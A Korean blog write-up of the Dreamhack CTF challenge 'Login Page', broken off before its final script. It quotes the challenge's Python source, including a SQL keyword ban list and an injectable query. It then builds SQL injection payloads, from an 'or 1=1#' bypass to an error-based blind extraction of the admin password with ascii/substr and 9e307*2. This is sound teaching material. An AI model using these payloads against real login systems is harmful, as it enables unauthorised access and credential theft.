---
layout: single
title: "[Dreamhack] Login Page write-up"
date: 2024-11-27 20:45 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] Login Page

<br>

### 문제 설명

- Python으로 작성된 로그인 페이지입니다.
- admin으로 로그인하여 플래그를 획득하세요.
- 플래그 형식은 DH{...}입니다.

<br>

### 풀이

문제 접속하면 login page에 접속하는 버튼이 존재한다.

<img src="/images/2024-11-28-Login-Page/image-20241128205201929.png" alt="image-20241128205201929" style="zoom:50%;" />

<br>

접속하면 `username` 과 `password` 를 입력하는 로그인 입력 폼이 나오고, 엔드포인트는 `/login` 이다.

<img src="/images/2024-11-28-Login-Page/image-20241128205328762.png" alt="image-20241128205328762" style="zoom:50%;" />

<br>

문제 파일에서 init.sql을 확인해봤는데 admin 계정의 INSERT 문이 존재하길래 한 번 테스트 해봤다.

```sql
CREATE DATABASE reset_db CHARACTER SET utf8;
CREATE USER 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';
GRANT ALL PRIVILEGES ON reset_db.* TO 'dbuser'@'localhost';

USE `reset_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  username varchar(128) not null,
  password varchar(128) not null
);

INSERT INTO users (username, password) values ('admin', 'initial_passwordqwer1234');
```

<br>

역시 이렇게 호락호락하게 문제가 풀리진 않을 것이다.

<img src="/images/2024-11-28-Login-Page/image-20241128212759709.png" alt="image-20241128212759709" style="zoom:50%;" />

<br>

일단 소스 코드를 살펴보면 처음에 `MAX_LOGIN_TRIES`와 `SQL_BAN_LIST` 변수들에 각각 6이라는 시도 횟수와 쿼리에 사용하면 안되는 단어와 특수문자들을 필터링하기 위해서 넣어 놓은 것을 볼 수 있다.

```python
MAX_LOGIN_TRIES = 6

SQL_BAN_LIST = [
    'update', 'extract', 'lpad', 'rpad', 'insert', 'values', '~', ':', '+',
    'union', 'end', 'schema', 'table', 'drop', 'delete', 'sleep', 'substring',
    'database', 'declare', 'count', 'exists', 'collate', 'like', '!', '"',
    '$', '%', '&', '+', '.', ':', '<', '>', 'delay', 'wait', 'order', 'alter'
]
```

<br>

`check_query_ban_list` 함수는 쿼리를 소문자로 변경하여 쿼리에서 `SQL_BAN_LIST` 가 존재하는지 확인하고 있다면 Fasle를 반환한다.

```python
def check_query_ban_list(query):
    for banned in SQL_BAN_LIST:
        if banned in query.lower():
            return False
    return True
```

<br>

`reset_password` 함수는 비밀번호를 재설정할 때 16바이트의 랜덤함수를 두번 base64로 암호화하여 `SQL_BAN_LIST` 에 걸리는지 한 번 체크한다. 그 후 UPDATE 문으로 admin의 패스워드를 업데이트한다. 

```python
def reset_password():
    global cursor, db

    # Generate new password.
    while True:
        new_password = base64.b64encode(base64.b64encode(os.urandom(16))).decode()
        if check_query_ban_list(new_password):
            break

    # Update new password.
    done = False
    while not done:
        try:
            query = 'UPDATE users SET password = %s WHERE username = \'admin\''
            cursor.execute(query, (new_password, ))
            db.commit()
            done = True
        except pymysql.err.InterfaceError:
            db.close()
            db, cursor = connect_mysql()
```

<br>

`/login` 엔드포인트의 소스 코드에서 중요한 부분만 살펴보면 일단 `username`과 `password` 중에 하나라도 `check_query_ban_list` 함수에 걸리면 패스워드를 재설정하고 tries 세션을 0으로 만들고 아래의 msg를 반환한다. 그리고 사용자가 입력한 username과 password를 쿼리에 대입해서 값을 받아오고, username과 password 둘 중 하나라도 실제 반환된 admin 계정의 username과 password가 아니면 마찬가지로 패스워드가 재설정된다.

```python
    if not check_query_ban_list(username) \
            or not check_query_ban_list(password):
        reset_password()
        session['tries'] = 0
        msg = 'What? you are hacker! I reset password!'
        return render_template('login.html', msg=msg)

    # Query the user.
    done = False
    while not done:
        try:
            query = 'SELECT * FROM users WHERE username = \'{0}\' ' \
                    'AND password = \'{1}\''
            with lock:
                query = query.format(username, password)
                cursor.execute(query)
                ret = cursor.fetchone()
            done = True
        except pymysql.err.InterfaceError:
            db.close()
            db, cursor = connect_mysql()
            
    if username != actual_username or password != actual_password:
        reset_password()
        session['tries'] = 0
        msg = 'What? you are hacker! I reset password!'
        return render_template('login.html', msg=msg)
```

<br>

`SQL_BAN_LIST` 의 필터링을 보면 and, or, =, --, # 를 일단 막지 않았고, username 부분에 `admin' or 1=1#` 을 넣어 뒤에 쿼리 부분을 주석처리 하고 password 부분은 `test`로 아무 값이나 입력해주니 hacker 문자열이 나온다. 그리고 /login 소스 코드에서도 보면 사용자가 입력한 username과 password가 실제 admin 계정의 username과 password가 일치해야 하기 때문에 blind sqli를 사용해야 하는 것 같다. 

![image-20241128221207107](/images/2024-11-28-Login-Page/image-20241128221207107.png)

<br>

음.. 근데 일단 blind sqli로 맞춰본다고 해도 저 hacker라는 msg가 나오면서 admin의 비밀번호가 재설정되기 때문에 어떻게 해야할까..
<br>

이 코드에서 한 가지 방법이 생각났다. /login 엔드포인트에서 세션 값이 없으면 / 경로로 리다이렉션하여 id와 tries 값을 0으로 초기화하게 되는데 blind를 계속 시도하면서 세션 값을 지우게 되면 tries 값이 0으로 초기화 되면서 계속해서 admin의 패스워드를 확인해볼 수 있을 것 같다.

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if session:
        return redirect('/login')

    if request.method == 'GET':
        return render_template('index.html')

    # POST
    # Set a session per user.
    if not session:
        session['id'] = os.urandom(16)
        session['tries'] = 0
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    global cursor, db

    if not session:
        return redirect('/')

    if request.method == 'GET':
        return render_template('login.html', msg=None)
```

<br>

해당 필터링 문자열에서 보면 blind에서 자주 사용하는 substring이 보이는데 substr을 사용하면 될 것 같다. 그리고 테이블 구조도 init.sql에서 보면 users 테이블에 각 컬럼이 username과 password로 되어 있는 것을 알 수 있다. 일단 패스워드 쿼리 부분에서 () 문자로 묶고 하면 될 거 같은데 table, <, > 를 우회해야 한다.

```python
SQL_BAN_LIST = [
    'update', 'extract', 'lpad', 'rpad', 'insert', 'values', '~', ':', '+',
    'union', 'end', 'schema', 'table', 'drop', 'delete', 'sleep', 'substring',
    'database', 'declare', 'count', 'exists', 'collate', 'like', '!', '"',
    '$', '%', '&', '+', '.', ':', '<', '>', 'delay', 'wait', 'order', 'alter'
]
```

```sql
USE `reset_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  username varchar(128) not null,
  password varchar(128) not null
);
```

<br>
blind sqli 가 들어갈 부분은 아래 쿼리처럼 admin 뒤에 select 문으로 해서 만들면 될 것 같다.

```sql
SELECT * FROM users WHERE username = 'admin' and ((select 'test') = 'test')-- ' AND password = '123'

//
username = admin' and ((select 'test') = 'test')-- 
password = 123
```

![image-20241128225848199](/images/2024-11-28-Login-Page/image-20241128225848199.png)

<br>

가장 먼저 해야할 건 admin 계정의 password를 조회하는 select 문이 필요하다.

```sql
select password from users where username = 'admin'
```

<br>

다음으로 ascii와 substr 함수를 사용해서 admin 계정의 패스워드 중 첫 번째 글자부터 한글자만 선택해서 아래와 같이 쿼리를 만들었다.

```sql
(ascii(substr((select문),1,1))
(ascii(substr((select password from users where username = 'admin'),1,1))
admin' and (ascii(substr((select password from users where username = 'admin'),1,1)) = 97)-- 
```

<br>

테스트해보니까 필터링에도 안걸리고 일단  sql 쿼리가 잘 들어가는 것 같다.

![image-20241128232256338](/images/2024-11-28-Login-Page/image-20241128232256338.png)

<br>

여기서 한가지 더 문제가 있는데 여기서 해당 자리의 문자가 맞는다고 하더라도 비밀번호가 바로 초기화되기 때문에 이를 우회할 방법이 필요하다. 일단 나는 mariadb에서 거의 최대값인 `9e307`을 두 번 곱하게 되면 에러가 나게 된다. 따라서 if문으로 아래와 같이 사용 가능하다. 패스워드 길이가 15로 가정하고 참이면 9e307*2로 에러를 반환하고 거짓이면 0을 반환하는데 상태코드가 200이 아니면 참이라고 보면 될 거 같다.

```sql
admin' and if(length((select password from users where username = 'admin')) = 15, 9e307*2, 0)--
```

<br>

코드를 짜보면 일단 세션을 전에 있던 값을 강제로 바꾸면 조작된 세션값이 secret_key로 서명된 것이 아니라면 flask가 세션 값을 자동으로 초기화해준다.